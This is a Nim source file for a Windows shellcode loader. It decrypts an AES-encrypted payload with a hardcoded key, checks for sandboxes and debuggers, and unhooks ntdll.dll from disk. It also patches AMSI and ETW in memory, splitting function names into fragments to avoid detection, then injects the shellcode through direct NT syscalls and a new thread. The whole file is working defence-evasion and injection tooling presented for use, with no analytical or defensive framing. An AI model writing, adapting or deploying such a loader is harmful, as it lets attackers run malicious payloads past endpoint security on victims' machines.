import winim
import winim/lean
import dynlib
import strutils
import ptr_math
import strformat
import psutil
import net
import nimcrypto
import random
import times
include GetSyscallStub

# ==================
# CHANGE THIS VALUES
# ==================

var enc_bytes: seq[byte] = @[0x49, 0xa8, 0x99, 0xc9, 0xfe, 0xc4, 0x83, 0x61, 0x1d, 0xe7, 0x27, 0x82, 0x0f, 0xe7, 0x56, 0x26, 0xb2, 0xd7, 0xa6, 0x40, 0xbf, 0x99, 0x1a, 0xd2, 0xf4, 0xa0, 0x84, 0x5d, 0x88, 0xd7, 0x87, 0x49, 0x7f, 0x16, 0xa6, 0xdb, 0x0d, 0xb3, 0x32, 0x5c, 0xcc, 0xb3, 0xee, 0xdf, 0x15, 0x29, 0xcf, 0x01, 0x3a, 0xab, 0x84, 0xe4, 0x14, 0xdf, 0x6d, 0x42, 0x69, 0x48, 0x0b, 0xa4, 0x55, 0x70, 0xc1, 0x77, 0x14, 0xc4, 0x0e, 0x34, 0x24, 0x77, 0xbd, 0x66, 0x25, 0x9e, 0x2c, 0x77, 0x42, 0x61, 0xcf, 0x51, 0x16, 0x2c, 0xc6, 0x2b, 0xe3, 0x30, 0x27, 0x49, 0xd6, 0xc9, 0xf6, 0x26, 0xc3, 0x95, 0x92, 0xaa, 0xc1, 0x28, 0xad, 0x59, 0x89, 0x50, 0x80, 0x2e, 0x98]

var psk: string = "SAPCOQzanFlIveaPmDjlabgzKaEdNWmu"

var iv: array[aes256.sizeBlock, byte] = [0xfa, 0x40, 0x86, 0xfa, 0x5e, 0x00, 0x21, 0x32, 0x44, 0xc8, 0x55, 0x6b, 0xfb, 0x92, 0x34, 0xac]

# Decrypt shellcode using AES
proc decryptBytes(src: seq[byte], psk: string, iv: array[aes256.sizeBlock, byte]): seq[byte] =
  var
    dctx: CTR[aes256]
    enctext: seq[byte] = src
    key: array[aes256.sizeKey, byte]

  var expandedkey = sha256.digest(psk)
  copyMem(addr key[0], addr expandedkey.data[0], len(expandedkey.data))

  var dectext = newSeq[byte](len(enctext))

  dctx.init(key, iv)
  dctx.decrypt(enctext, dectext)
  dctx.clear()

  return dectext

func toByteSeq*(str: string): seq[byte] {.inline.} =
    # Converts a string to the corresponding byte sequence
    @(str.toOpenArrayByte(0, str.high))

proc bytesToHexSeq*(src: seq[byte]): string =
  var res: string = "@["
  for b in src:
    res = res & "0x" & toLowerAscii(toHex(b)) & ", "
  res = res[0..^3] & "]"

  return res

# Custom sleep function while doing weird calculations
proc customSleep*(secondsToSleep: int) =
  var y: int
  randomize()
  var startTime = now()
  while (now() - startTime).inSeconds < secondsToSleep:
    y = y + 1

# Do some basic anti-sandbox checks
proc checkSandbox(): bool =
  # check internet connection
  try:
    let socket = newSocket()
    socket.connect("google.com", Port(80))
    socket.close()
  except OSError:
    return true

  # check RAM memory
  if (float(virtualMemory().total) / 1024 / 1024 / 1024) < 4.0:
    return true

  # checking debugger
  var fileName: array[MAX_PATH + 1, WCHAR]
  discard GetModuleFileNameW(0, addr fileName[0], MAX_PATH)
  var res = CreateFileW(addr fileName[0], GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, 0)
  CloseHandle(res)

  if (res == INVALID_HANDLE_VALUE):
    return true

  # check cpu cores
  if cpuCount() <= 2:
    return true

proc unhook(): bool =
  let low: uint16 = 0
  var
    processH = GetCurrentProcess()
    mi : MODULEINFO
    ntdllModule = GetModuleHandleA("ntdll.dll")
    ntdllBase : LPVOID
    ntdllFile : FileHandle
    ntdllMapping : HANDLE
    ntdllMappingAddress : LPVOID
    hookedDosHeader : PIMAGE_DOS_HEADER
    hookedNtHeader : PIMAGE_NT_HEADERS
    hookedSectionHeader : PIMAGE_SECTION_HEADER

  GetModuleInformation(processH, ntdllModule, addr mi, cast[DWORD](sizeof(mi)))
  ntdllBase = mi.lpBaseOfDll
  ntdllFile = getOsFileHandle(open("C:\\windows\\system32\\ntdll.dll", fmRead))

  ntdllMapping = CreateFileMapping(ntdllFile, NULL, 16777218, 0, 0, NULL)
  if ntdllMapping == 0:
    echo fmt"Error: {GetLastError()}"
    return false

  ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
  if ntdllMappingAddress.isNil:
    echo fmt"Error: {GetLastError()}"
    return false

  hookedDosHeader = cast[PIMAGE_DOS_HEADER](ntdllBase)
  hookedNtHeader = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](ntdllBase) + hookedDosHeader.e_lfanew)
  for Section in low ..< hookedNtHeader.FileHeader.NumberOfSections:
    hookedSectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(hookedNtHeader)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))
    if ".text" in toString(hookedSectionHeader.Name):
      var oldProtection : DWORD = 0
      if VirtualProtect(ntdllBase + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize, 0x40, addr oldProtection) == 0:
        echo fmt"Error {GetLastError()}"
        return false

      copyMem(ntdllBase + hookedSectionHeader.VirtualAddress, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize)
      if VirtualProtect(ntdllBase + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize, oldProtection, addr oldProtection) == 0:
        echo fmt"Error: {GetLastError()}"
        return false

  CloseHandle(processH)
  CloseHandle(ntdllFile)
  CloseHandle(ntdllMapping)
  FreeLibrary(ntdllModule)

  return true

proc patchAmsi(): bool =
  const patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]

  var
    amsi: LibHandle
    cs: PVOID
    op: DWORD
    t: DWORD

  amsi = loadLib("amsi")
  if isNil(amsi):
    return false

  cs = amsi.symAddr("Ams" & "iOp" & "en" & "Ses" & "si" & "on")
  if isNil(cs):
      return false

  if NtProtectVirtualMemory(GetCurrentProcess(), unsafeAddr cs, cast[PSIZE_T](len(patch)), PAGE_EXECUTE_READWRITE, addr op):
    copyMem(unsafeAddr cs, unsafeAddr patch, len(patch))
    discard NtProtectVirtualMemory(GetCurrentProcess(), unsafeAddr cs, cast[PSIZE_T](len(patch)), op, addr t)

  return true

proc patchEtw(): bool =
  const patch: array[1, byte] = [byte 0xc3]

  var
    ntdll: LibHandle
    cs: PVOID
    op: DWORD
    t: DWORD

  ntdll = loadLib("ntdll")
  if isNil(ntdll):
    return false

  #cs = ntdll.symAddr("Et" & "wE" & "vent" & "Wr" & "it" & "e")
  cs = ntdll.symAddr("NtTr" & "aceE" & "vent")
  if isNil(cs):
    return false

  if NtProtectVirtualMemory(GetCurrentProcess(), unsafeAddr cs, cast[PSIZE_T](patch.len), PAGE_EXECUTE_READWRITE, addr op):
    copyMem(unsafeAddr cs, unsafeAddr patch, patch.len)
    discard NtProtectVirtualMemory(GetCurrentProcess(), unsafeAddr cs, cast[PSIZE_T](patch.len), op, addr t)

  return true

proc inject(shellcode: seq[byte]): bool =
  var
    pHandle: HANDLE = GetCurrentProcess()
    baseAddr: LPVOID
    sc_size: SIZE_T = cast[SIZE_T](len(shellcode))
    bytesWritten: SIZE_T
    oldProtect: DWORD = 0
    status: WINBOOL
    tHandle: HANDLE

  echo "  > Allocating memory"

  status = NtAllocateVirtualMemory(pHandle, &baseAddr, 0, &sc_size, MEM_COMMIT, PAGE_READWRITE)
  if status != 0:
    return false

  echo "  > Writing shellc0de"

  status = NtWriteVirtualMemory(pHandle, baseAddr, addr shellcode[0], sc_size-1, addr bytesWritten)
  if status != 0:
    return false

  echo "  > Protecting memory"

  status = NtProtectVirtualMemory(pHandle, &baseAddr, &sc_size, PAGE_EXECUTE_READ, &oldProtect)
  if status != 0:
    return false

  echo "  > Creating remote thread"

  status = NtCreateThreadEx(&tHandle, 0x1FFFFF, NULL, pHandle, baseAddr, NULL, FALSE, 0, 0, 0, NULL)
  if status != 0:
    return false

  WaitForSingleObject(tHandle, cast[DWORD](0xffffffff))

  return true

# Main function
proc main(): void =
  echo "[*] Checking san" & "db0x"
  if checkSandbox():
    echo "[-] Potentially a sn" & "db0x"
    quit(0)

  echo "[*] Sleeping"
  customSleep(30)

  var ret: bool

  echo "[*] Unhooking ntdl" & "l.dll"
  ret = unhook()
  if ret == false:
    echo "[-] Error unhooking ntd" & "ll"
    quit(0)

  echo "[*] Patching AM" & "SI"
  ret = patchAmsi()
  if ret == false:
    echo "[-] Error patching AM" & "SI"
    quit(0)

  echo "[*] Patching ETW"
  ret = patchEtw()
  if ret == false:
    echo "[-] Error patching ETW"
    quit(0)

  echo "\n[*] Decrypting shel" & "lc" & "0de"
  echo "[+] Encrypted shel" & "lc" & "0de: ", bytesToHexSeq(enc_bytes)

  let shellcode: seq[byte] = decryptBytes(enc_bytes, psk, iv)

  echo "[+] Raw shellc0de: ", bytesToHexSeq(shellcode)

  echo "\n[*] Sleeping again"
  customSleep(10)

  echo "\n[*] Executing shel" & "lc0" & "de"
  status = inject(shellcode)
  if status:
    echo "\n[+] Success!"
  else:
    echo "\n[-] Error executing shellc0de"

# Entrypoint
when defined(windows):
  when isMainModule:
    main()






